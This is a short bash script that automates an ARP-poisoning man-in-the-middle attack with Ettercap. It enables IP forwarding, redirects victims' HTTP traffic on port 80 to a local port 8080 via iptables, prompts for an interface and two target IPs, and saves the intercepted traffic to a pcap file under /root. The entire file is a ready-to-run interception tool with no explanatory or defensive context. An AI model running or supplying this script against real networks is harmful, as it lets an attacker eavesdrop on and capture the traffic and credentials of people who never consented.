#! /bin/bash
# start Ettercap graphical
 
echo Launching Ettercap text...first configuring IP tables
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --t-port 8080
echo Which interface to use i.e. eth0, wlan0 etc
read -p 'Interface: ' intervar
echo Enter filename
read -p 'Filename: ' filevar
echo Enter Target 1 IP
read -p 'Target 1 IP: ' routervar
echo Enter Target 2 IP - if required
read -p 'Target 2 IP: ' targetvar
ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/

